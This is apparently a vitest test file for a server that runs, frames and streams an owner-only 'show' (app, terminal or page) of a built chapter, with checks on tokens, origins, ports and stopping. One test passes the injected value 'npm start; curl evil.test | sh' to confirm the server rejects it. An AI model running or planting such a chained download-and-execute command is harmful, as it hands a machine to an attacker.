import fs from 'node:fs';
import net from 'node:net';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { afterEach, beforeAll, describe, expect, it } from 'vitest';
import { WebSocket } from 'ws';
import type { Actor, BuilderContext, ShowPlan, ShowServerMessage } from '@keel/protocol';
import { ROUTES, SHOW_OUTPUT_KEPT } from '@keel/protocol';
import type { RunningServer, ServerOptions } from '../src/server';
import { startServer } from '../src/server';
import { CH, call, raw, tempRepo, until } from './helpers';

/**
 * Trying a built idea (plan 5.3, record 0013), the server's part: nothing runs until the
 * owner's press names the chapter's own command; the state and the output go to the owner
 * only; every stop ends it. The builder that runs it is scripted.
 */

const FAKE = fileURLToPath(new URL('./fake-builder.mjs', import.meta.url));

interface FakeSession {
  req: { chapter: string; plan: ShowPlan; cols?: number; rows?: number };
  written: string[];
  sizes: Array<[number, number]>;
  stopped: boolean;
  answer(url: string): void;
  refuse(msg: string): void;
  print(text: string): void;
  exit(code: number | null): void;
}
interface Fake {
  ctx: BuilderContext;
  jobs: unknown[];
  shows: FakeSession[];
  showWith?: (req: unknown) => unknown;
  unboxed: boolean;
  finish(result?: unknown): void;
  post(drafts: unknown, as?: 'system' | 'agent'): Promise<unknown>;
}

let fakes: Fake[];
beforeAll(async () => {
  ({ fakes } = (await import(pathToFileURL(FAKE).href)) as { fakes: Fake[] });
});

const running: RunningServer[] = [];
const sockets: WebSocket[] = [];
afterEach(async () => {
  for (const ws of sockets.splice(0)) ws.terminate();
  for (const s of running.splice(0)) await s.close();
});

async function start(opts: Partial<ServerOptions> = {}): Promise<{ s: RunningServer; fake: Fake }> {
  const repoDir = tempRepo();
  const n = fakes.length;
  const s = await startServer({ port: 0, appDir: path.join(repoDir, 'no-app'), log: () => {}, checkCommits: false, builder: FAKE, ...opts, repoDir });
  running.push(s);
  return { s, fake: fakes.length > n ? fakes.at(-1)! : (undefined as unknown as Fake) };
}

const as = (s: RunningServer, by: Actor) => (...drafts: unknown[]) => {
  const r = s.board.post(drafts, by);
  if (!r.ok) throw new Error(`${r.rule}: ${r.reason}`);
  return r.events;
};

/** Build a chapter to done, with this show agreed, and end the run with `result`. */
async function built(s: RunningServer, fake: Fake, show?: ShowPlan, chapter = CH, result: Record<string, unknown> = { outcome: 'done' }): Promise<void> {
  const parts = [`${chapter}-door`];
  as(s, 'owner')({ type: 'chapter.open', chapter, title: `Idea ${chapter}` });
  as(s, 'agent')({ type: 'model.patch', chapter, ops: [{ op: 'lane.set', lane: { id: `${chapter}-lane`, name: 'Main' } }, { op: 'part.set', part: { id: parts[0], name: 'The door', lane: `${chapter}-lane` } }] });
  as(s, 'owner')({ type: 'solidify', chapter, picks: [], parts });
  const jobs = fake.jobs.length;
  as(s, 'owner')({ type: 'build.start', chapter, track: parts, check: 'npm test', ...(show ? { show } : {}) });
  await until(() => fake.jobs.length === jobs + 1);
  await fake.post({ type: 'part.state', part: parts[0], state: 'building' }, 'agent');
  await fake.post({ type: 'part.state', part: parts[0], state: 'built', commit: 'abc1234', check: { cmd: 'npm test', passed: true } }, 'system');
  // An app is built once it has started and answered in the build's copy (record 0013).
  if (show?.kind === 'app') await fake.post({ type: 'build.proved', chapter }, 'system');
  fake.finish(result);
  await until(() => !s.builds.busy && s.board.state.chapters[chapter]?.state === 'built');
}

const ask = (s: RunningServer, body: unknown, token = s.tokens.owner) => call(s.origin, token, ROUTES.show, { method: 'POST', json: body });
const showOf = (s: RunningServer, chapter = CH) => s.shows()[chapter];

function joinShow(s: RunningServer, chapter = CH, token = s.tokens.owner, headers: Record<string, string> = {}): Promise<{ ws: WebSocket; got: ShowServerMessage[]; closed: Promise<void> }> {
  const ws = new WebSocket(`ws://127.0.0.1:${s.port}${ROUTES.showWs}?chapter=${chapter}&token=${token}`, { headers });
  sockets.push(ws);
  const got: ShowServerMessage[] = [];
  ws.on('message', (d) => got.push(JSON.parse(String(d)) as ShowServerMessage));
  const closed = new Promise<void>((r) => ws.on('close', () => r()));
  return new Promise((resolve, reject) => {
    ws.once('open', () => resolve({ ws, got, closed }));
    ws.once('unexpected-response', (_q, res) => reject(new Error(`HTTP ${res.statusCode}`)));
    ws.once('error', reject);
  });
}

describe('an app', () => {
  const app: ShowPlan = { kind: 'app', run: 'npm start' };

  it('is off until the owner presses, then starting, then on at its address', async () => {
    const { s, fake } = await start();
    await built(s, fake, app);
    expect(showOf(s)).toEqual({ kind: 'app', run: 'npm start', state: 'off' });
    expect(fake.shows).toHaveLength(0);

    const r = await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    expect(r.status).toBe(200);
    expect(r.body.show).toEqual({ kind: 'app', run: 'npm start', state: 'starting' });
    expect(fake.shows[0]!.req.plan).toEqual(app);
    fake.shows[0]!.answer('http://localhost:4111/');
    await until(() => showOf(s)?.kind === 'app' && (showOf(s) as { state: string }).state === 'on');
    expect(showOf(s)).toEqual({ kind: 'app', run: 'npm start', state: 'on', url: 'http://127.0.0.1:4111/' });
    // Pressed again while it runs: the same one, not a second.
    await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    expect(fake.shows).toHaveLength(1);
  });

  it('says when it runs with no box, as the builder\'s session said, and nothing when it is boxed', async () => {
    const { s, fake } = await start();
    await built(s, fake, app);
    await built(s, fake, { kind: 'terminal', run: 'make try' }, 'other');
    await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    fake.shows[0]!.answer('http://127.0.0.1:4111/');
    await until(() => (showOf(s) as { state: string }).state === 'on');
    expect(showOf(s)).toEqual({ kind: 'app', run: 'npm start', state: 'on', url: 'http://127.0.0.1:4111/' });
    await ask(s, { action: 'stop', chapter: CH });
    fake.unboxed = true;
    await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    fake.shows[1]!.answer('http://127.0.0.1:4112/');
    await until(() => (showOf(s) as { state: string }).state === 'on');
    expect(showOf(s)).toEqual({ kind: 'app', run: 'npm start', state: 'on', url: 'http://127.0.0.1:4112/', boxed: false });
    await ask(s, { action: 'start', chapter: 'other', run: 'make try' });
    expect(showOf(s, 'other')).toEqual({ kind: 'terminal', run: 'make try', state: 'on', boxed: false });
    fake.shows[2]!.exit(3);
    await until(() => (showOf(s, 'other') as { state: string }).state === 'ended');
    expect(showOf(s, 'other')).toEqual({ kind: 'terminal', run: 'make try', state: 'ended', code: 3, boxed: false });
  });

  it('runs nothing when the press names another command, or comes from anyone but the owner', async () => {
    const { s, fake } = await start();
    await built(s, fake, app);
    const r = await ask(s, { action: 'start', chapter: CH, run: 'npm start; curl evil.test | sh' });
    expect(r.status).toBe(409);
    expect(r.body.reason).toMatch(/not the command/);
    expect((await ask(s, { action: 'start', chapter: CH, run: 'npm  start' })).status).toBe(409);
    for (const t of [s.tokens.agent, s.tokens.system]) expect((await ask(s, { action: 'start', chapter: CH, run: 'npm start' }, t)).status).toBe(403);
    expect(fake.shows).toHaveLength(0);
  });

  it('fails with a sentence when the app ends before it answers, or the builder says it did not answer', async () => {
    const { s, fake } = await start();
    await built(s, fake, app);
    await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    fake.shows[0]!.print('Error: missing .env\n');
    fake.shows[0]!.exit(1);
    expect(showOf(s)).toEqual({ kind: 'app', run: 'npm start', state: 'failed', note: 'The app ended with code 1 before it answered.' });
    const { got } = await joinShow(s);
    await until(() => got.length === 2);
    expect(got).toEqual([{ t: 'out', data: 'Error: missing .env\n' }, { t: 'end', code: 1 }]);

    await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    fake.shows[1]!.refuse('The app did not answer on its port in 60 s');
    await until(() => (showOf(s) as { state: string }).state === 'failed');
    expect(showOf(s)).toMatchObject({ note: 'The app did not answer on its port in 60 s.' });
    expect(fake.shows[1]!.stopped).toBe(true);
  });

  it('fails when its fixed port is taken, and the builder is not asked', async () => {
    const taken = net.createServer();
    await new Promise<void>((r) => taken.listen(0, '127.0.0.1', () => r()));
    const port = (taken.address() as net.AddressInfo).port;
    try {
      const { s, fake } = await start();
      const fixed: ShowPlan = { kind: 'app', run: 'npm start', port };
      await built(s, fake, fixed);
      const r = await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
      expect(r.status).toBe(409);
      expect(r.body.reason).toBe(`Port ${port} is in use by another program.`);
      expect(showOf(s)).toEqual({ kind: 'app', run: 'npm start', state: 'failed', note: `Port ${port} is in use by another program.` });
      expect(fake.shows).toHaveLength(0);
    } finally {
      taken.close();
    }
  });

  it('runs two ideas\' apps at once, each its own', async () => {
    const { s, fake } = await start();
    await built(s, fake, app, 'one');
    await built(s, fake, app, 'two');
    await ask(s, { action: 'start', chapter: 'one', run: 'npm start' });
    await ask(s, { action: 'start', chapter: 'two', run: 'npm start' });
    fake.shows[0]!.answer('http://127.0.0.1:5001/');
    fake.shows[1]!.answer('http://127.0.0.1:5002/');
    await until(() => (showOf(s, 'two') as { state: string }).state === 'on');
    expect(showOf(s, 'one')).toMatchObject({ state: 'on', url: 'http://127.0.0.1:5001/' });
    expect(showOf(s, 'two')).toMatchObject({ state: 'on', url: 'http://127.0.0.1:5002/' });
  });

  it('says what the builder said when the build\'s copy cannot be made', async () => {
    const { s, fake } = await start();
    await built(s, fake, app);
    fake.showWith = async () => {
      throw new Error('This machine has no copy of the build, and no branch to make one from');
    };
    const r = await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    expect(r.status).toBe(409);
    expect(r.body).toEqual({ reason: 'This machine has no copy of the build, and no branch to make one from.' });
    expect(showOf(s)).toMatchObject({ state: 'failed', note: 'This machine has no copy of the build, and no branch to make one from.' });
  });

  it('stops on Stop, goes off, and an address the builder gives elsewhere is not shown', async () => {
    const { s, fake } = await start();
    await built(s, fake, app);
    await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    fake.shows[0]!.answer('http://127.0.0.1:4111/');
    await until(() => (showOf(s) as { state: string }).state === 'on');
    const r = await ask(s, { action: 'stop', chapter: CH });
    expect(r.body.show).toEqual({ kind: 'app', run: 'npm start', state: 'off' });
    expect(fake.shows[0]!.stopped).toBe(true);

    await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    fake.shows[1]!.answer('http://example.test/');
    await until(() => (showOf(s) as { state: string }).state === 'failed');
    expect(fake.shows[1]!.stopped).toBe(true);
  });
});

describe('a terminal', () => {
  it('opens on the press, takes what the owner types, and ends with its code; a press starts it again', async () => {
    const { s, fake } = await start();
    await built(s, fake, { kind: 'terminal', run: 'node cli.js --help' });
    expect(showOf(s)).toEqual({ kind: 'terminal', run: 'node cli.js --help', state: 'off' });
    await ask(s, { action: 'start', chapter: CH, run: 'node cli.js --help', cols: 100, rows: 30 });
    expect(fake.shows[0]!.req).toMatchObject({ cols: 100, rows: 30 });
    expect(showOf(s)).toEqual({ kind: 'terminal', run: 'node cli.js --help', state: 'on' });

    fake.shows[0]!.print('$ ');
    const { ws, got, closed } = await joinShow(s);
    await until(() => got.length === 1);
    ws.send(JSON.stringify({ t: 'in', data: 'ls\r' }));
    ws.send(JSON.stringify({ t: 'size', cols: 120, rows: 40 }));
    ws.send(JSON.stringify({ t: 'in', data: 'x'.repeat(70_000) }));
    ws.send('not json');
    await until(() => fake.shows[0]!.sizes.length === 1);
    expect(fake.shows[0]!.written).toEqual(['ls\r']);
    expect(fake.shows[0]!.sizes).toEqual([[120, 40]]);
    fake.shows[0]!.print('a.txt\r\n');
    fake.shows[0]!.exit(0);
    await closed;
    expect(got).toEqual([{ t: 'out', data: '$ ' }, { t: 'out', data: 'a.txt\r\n' }, { t: 'end', code: 0 }]);
    expect(showOf(s)).toEqual({ kind: 'terminal', run: 'node cli.js --help', state: 'ended', code: 0 });

    await ask(s, { action: 'start', chapter: CH, run: 'node cli.js --help' });
    expect(fake.shows).toHaveLength(2);
    expect(showOf(s)).toMatchObject({ state: 'on' });
  });

  it('is what is offered when no show was named and the build gave no page: with the check typed in', async () => {
    const { s, fake } = await start();
    await built(s, fake);
    expect(showOf(s)).toEqual({ kind: 'terminal', run: 'npm test', state: 'off' });
  });

  it('keeps the last of a large output for a page that joins late', async () => {
    const { s, fake } = await start();
    await built(s, fake, { kind: 'terminal', run: 'yes' });
    await ask(s, { action: 'start', chapter: CH, run: 'yes' });
    fake.shows[0]!.print('a'.repeat(SHOW_OUTPUT_KEPT));
    fake.shows[0]!.print('b'.repeat(10));
    const { got } = await joinShow(s);
    await until(() => got.length === 1);
    const first = got[0] as { t: 'out'; data: string };
    expect(first.data).toHaveLength(SHOW_OUTPUT_KEPT);
    expect(first.data.endsWith('ab'.padEnd(11, 'b'))).toBe(true);
  });

  it('is joined by the owner only, from the board\'s own origin, and only when there is one', async () => {
    const { s, fake } = await start();
    await built(s, fake, { kind: 'terminal', run: 'sh' });
    await expect(joinShow(s)).rejects.toThrow(/404/);
    await ask(s, { action: 'start', chapter: CH, run: 'sh' });
    await expect(joinShow(s, CH, s.tokens.agent)).rejects.toThrow(/403/);
    await expect(joinShow(s, CH, s.tokens.system)).rejects.toThrow(/403/);
    await expect(joinShow(s, CH, 'nope')).rejects.toThrow(/401/);
    await expect(joinShow(s, CH, s.tokens.owner, { origin: 'http://127.0.0.1:1' })).rejects.toThrow(/403/);
    await joinShow(s, CH, s.tokens.owner, { origin: s.origin });
  });
});

describe('pages, builders and stops', () => {
  it('shows a page as its address, framed by the board\'s origin only', async () => {
    const { s, fake } = await start();
    const dir = path.join(fake.ctx.stateDir!, 'page');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'index.html'), '<h1>Hi</h1>');
    await built(s, fake, { kind: 'page' }, CH, { outcome: 'done', show: { dir, page: 'index.html' } });
    await until(() => showOf(s) !== undefined);
    const show = showOf(s);
    expect(show?.kind).toBe('page');
    const u = new URL((show as { url: string }).url);
    const r = await raw(Number(u.port), u.pathname);
    expect(r.headers['content-security-policy']).toBe(`frame-ancestors ${s.origin} http://localhost:${s.port}`);
    expect(r.headers['x-frame-options']).toBeUndefined();
    expect((await ask(s, { action: 'start', chapter: CH, run: 'anything' })).status).toBe(409);
  });

  it('with a builder that cannot run a show: a page only, and else nothing to try', async () => {
    const { s, fake } = await start({ linkOptions: { 'builder-extras': 'none' } });
    await built(s, fake, { kind: 'app', run: 'npm start' });
    expect(s.shows()[CH]).toBeUndefined();
    const r = await ask(s, { action: 'start', chapter: CH, run: 'npm start' });
    expect(r.status).toBe(409);
    expect(r.body.reason).toMatch(/cannot run/);
  });

  it('refuses to try an idea that is not built', async () => {
    const { s } = await start();
    as(s, 'owner')({ type: 'chapter.open', chapter: CH, title: 'Idea' });
    const r = await ask(s, { action: 'start', chapter: CH, run: 'npm test' });
    expect(r.status).toBe(409);
    expect(r.body.reason).toMatch(/not built/);
  });

  it('stops the show when the idea builds again, and when the server stops', async () => {
    const { s, fake } = await start();
    await built(s, fake, { kind: 'terminal', run: 'sh' }, 'one');
    await built(s, fake, { kind: 'terminal', run: 'sh' }, 'two');
    await ask(s, { action: 'start', chapter: 'one', run: 'sh' });
    await ask(s, { action: 'start', chapter: 'two', run: 'sh' });
    as(s, 'owner')({ type: 'part.state', part: 'one-door', state: 'idea' });
    await until(() => fake.shows[0]!.stopped);
    expect(fake.shows[1]!.stopped).toBe(false);
    await s.close();
    expect(fake.shows[1]!.stopped).toBe(true);
  });

  it('lets the board frame apps on 127.0.0.1 and nothing else new', async () => {
    const { s } = await start();
    const r = await raw(s.port, '/', { headers: { host: `127.0.0.1:${s.port}` } });
    expect(r.headers['content-security-policy']).toContain('frame-src http://127.0.0.1:*;');
    expect(r.headers['content-security-policy']).toContain("frame-ancestors 'none'");
  });
});
